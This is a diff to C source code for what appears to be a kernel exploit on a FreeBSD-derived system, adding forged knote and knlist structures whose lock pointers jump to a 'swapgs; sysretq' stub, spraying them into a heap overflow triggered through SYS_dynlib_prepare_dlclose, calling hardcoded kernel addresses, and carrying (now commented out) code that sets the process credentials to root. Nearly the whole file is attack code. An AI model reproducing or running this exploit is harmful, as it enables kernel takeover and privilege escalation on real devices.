@@ -9,6 +9,62 @@
 #include "alloc.h"
 #include "util.h"
 
+/*
+struct knote;
+SLIST_HEAD(klist, knote);
+struct kqueue;
+TAILQ_HEAD(kqlist, kqueue);
+struct knlist {
+	struct	klist	kl_list;
+	void    (*kl_lock)(void *);
+	void    (*kl_unlock)(void *);
+	void	(*kl_assert_locked)(void *);
+	void	(*kl_assert_unlocked)(void *);
+	void *kl_lockarg;
+};
+*/
+
+typedef	__int64_t	sbintime_t;
+
+struct knote {
+	SLIST_ENTRY(knote)	kn_link;	/* for kq */
+	SLIST_ENTRY(knote)	kn_selnext;	/* for struct selinfo */
+	struct			knlist *kn_knlist;	/* f_attach populated */
+	TAILQ_ENTRY(knote)	kn_tqe;
+	struct			kqueue *kn_kq;	/* which queue we are on */
+	struct 			kevent kn_kevent;
+	int			kn_status;	/* protected by kq lock */
+#define KN_ACTIVE	0x01			/* event has been triggered */
+#define KN_QUEUED	0x02			/* event is on queue */
+#define KN_DISABLED	0x04			/* event is disabled */
+#define KN_DETACHED	0x08			/* knote is detached */
+#define KN_INFLUX	0x10			/* knote is in flux */
+#define KN_MARKER	0x20			/* ignore this knote */
+#define KN_KQUEUE	0x40			/* this knote belongs to a kq */
+#define KN_HASKQLOCK	0x80			/* for _inevent */
+#define	KN_SCAN		0x100			/* flux set in kqueue_scan() */
+	int			kn_sfflags;	/* saved filter flags */
+	intptr_t		kn_sdata;	/* saved data field */
+	union {
+		struct		file *p_fp;	/* file data pointer */
+		struct		proc *p_proc;	/* proc pointer */
+		struct		aiocblist *p_aio;	/* AIO job pointer */
+		struct		aioliojob *p_lio;	/* LIO job pointer */
+		sbintime_t	*p_nexttime;	/* next timer event fires at */
+		void		*p_v;		/* generic other pointer */
+	} kn_ptr;
+	struct			filterops *kn_fop;
+	void			*kn_hook;
+	int			kn_hookid;
+
+#define kn_id		kn_kevent.ident
+#define kn_filter	kn_kevent.filter
+#define kn_flags	kn_kevent.flags
+#define kn_fflags	kn_kevent.fflags
+#define kn_data		kn_kevent.data
+#define kn_fp		kn_ptr.p_fp
+};
+
 // Some good to go stack sizes
 #define KExecChunkMax 0x100
 
@@ -55,7 +111,7 @@ void shell()
 void run(void *arg) // no idea if this user land function is (can?) ever been called by the kernel
 {
 	struct thread *td;
-	struct ucred *cred;
+	//struct ucred *cred;
 
 	struct sendto_args sargs;
 	struct write_args wargs;
@@ -73,11 +129,13 @@ void run(void *arg) // no idea if this user land function is (can?) ever been ca
 
 	__asm__ volatile("movq %%gs:0, %0" : "=r"(td)); // should be, no?
 
+/*
 	cred = td->td_proc->p_ucred;
 	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
 	cred->cr_groups[0] = 0;
 
 	//cred->cr_prison = ; // no good idea to get prison0 either
+*/
 
 	while(((SysWrite)0xffffffff8247b0f0)(td, &wargs) == EINTR);
 	while(((SysSendto)0xffffffff8249eba0)(td, &sargs) == EINTR);
@@ -85,15 +143,42 @@ void run(void *arg) // no idea if this user land function is (can?) ever been ca
 	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
 }
 
+void dummy(void *arg)
+{
+	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
+}
+
+/*
+	__asm__ volatile("swapgs;");
+	printf("bar");
+	fflush(stdout);
+	while(1){};
+	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
+*/
+
 void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t bufferSize, size_t overflowSize)
 {
 	int chunks[KExecChunkMax];
 	int bufferChunk;
 	int overflowChunk;
+	uint8_t *map;
 	long pageSize = sysconf(_SC_PAGESIZE);
 	size_t mapChunkSize = (bufferSize + overflowSize);
 	size_t mapOverflowSize = (0x100000000 + bufferSize) / 4;
+	struct klist *kist;
 	int i, r;
+	int fd = KExecChunkSizeCalulate(intermediateSize);
+	struct knote kote = {0};
+	struct knlist knist = {0};
+
+/*
+	struct knote *kote;
+	struct knlist *knist;
+	kote = malloc(0x80000); //0x1000 * sizeof(struct knote));
+	memset(kote, '\0', 0x80000); //0x1000 * sizeof(struct knote));
+	knist = malloc(0x80000); //0x1000 * sizeof(struct knlist));
+	memset(knist, '\0', 0x80000); // 0x1000 * sizeof(struct knlist));
+*/
 
 	// setup kernel chunks
 	for(i = 0; i < intermediateChunkCount; i++)
@@ -117,7 +202,7 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 		printf("kexecFree(bufferChunk) = %i\n", r);
 
 	// setup userland
-	uint8_t *map = mmap(NULL, mapChunkSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	map = mmap(NULL, mapChunkSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 
 	if(map == MAP_FAILED)
 	{
@@ -136,27 +221,61 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 
 	munmap(map + mapChunkSize, pageSize);
 
-	// copy & prepare overflow
-	struct knlist *list = (struct knlist *)(map + mapChunkSize - sizeof(struct knlist)); // list at end of overflow
-	list->kl_lock = run; // ... ?
+/*
+	i = 0;
+	for(kist = (struct klist *)(map + bufferSize); kist < (struct klist *)(map + bufferSize + overflowSize); ++kist)
+	{
+		knist[i].kl_list.slh_first = NULL;
+		knist[i].kl_lock = dummy;
+		knist[i].kl_unlock = knist[i].kl_assert_locked = knist[i].kl_assert_unlocked = dummy;
+		knist[i].kl_lockarg = NULL;
+		kote[i].kn_knlist = &knist[i];
+		kist->slh_first = &kote[i];
+		++i;
+	}
+	printf("set %i knotes and knlists\n", i);
+*/
 
-	// set list in knote
-	//for(i = 0; i < 32; ++i)
-	//	((void **)(map + bufferSize))[i] = list;
-	// should be @ 0x16, no? ... Oo?
-	((void **)(map + bufferSize))[2] = list;
+	knist.kl_list.slh_first = &kote;
+
+	knist.kl_lock = dummy;
+	knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = dummy;
+	knist.kl_lockarg = NULL;
+
+	kote.kn_knlist = &knist;
+	kote.kn_link.sle_next = kote.kn_selnext.sle_next = NULL; //&kote;
+	kote.kn_kevent.ident = fd;
+
+printf("%zu\n", sizeof(struct klist));
+
+	kist = (struct klist *)(map + bufferSize);
+	for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
+		kist[i].slh_first = &kote;
+	//kist[fd].slh_first = &kote;
 
 	// overflow
 	r = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
 	printf("SYS_dynlib_prepare_dlclose: %i\n", r);
 
-	// free all intermediates
+	printf("wait ... ");
+	sleep(10);
+	printf("go\n");
+	fflush(stdout);
+
+	// free all intermediates - unless global fd - nothing happens here
 	for(i = 0; i < intermediateChunkCount; i++)
 	{
+		printf("freeing: %i\n", i);
+		fflush(stdout);
 		r = kexecFree(chunks[i]);
 		if(r < 0)
 			printf("kexecFree(chunks[%i]) = %i\n", i, r);
 	}
+
+	printf("wait ... ");
+	sleep(0);
+	printf("go\n");
+	fflush(stdout);
 
 	printf("Pre Trigger\n");
 	fflush(stdout);
@@ -169,7 +288,7 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 
 	munmap(map, bufferSize); // mapChunkSize - overflowSize
 
-	/* close fd for unclosed global allocs */
+	// close fd for unclosed global allocs
 	r = kexecCloseGlobalIfNeeded();
 	if(r < 0)
 		printf("kexecCloseGlobalIfNeeded() = %i\n", r);
